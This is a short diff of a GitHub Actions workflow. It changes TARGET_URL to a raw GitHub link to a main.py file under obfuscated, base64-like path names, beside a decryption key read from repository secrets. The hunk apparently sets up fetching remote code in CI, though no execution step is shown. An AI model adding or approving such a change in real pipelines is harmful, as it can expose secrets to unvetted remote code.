@@ -24,7 +24,7 @@ jobs:
           DYNAMICS_TIMESTAMP=$(date +%s)
           
           # 2. Assign configuration assets explicitly inside the runner context
-          TARGET_URL="https://githubusercontent.com"
+          TARGET_URL="https://raw.githubusercontent.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/refs/heads/main/main.py"
           REAL_AES_KEY="${{ secrets.DECRYPT_KEY }}"
 
           # 3. Write the template asset using standard EOF (Allows instant inline rendering)
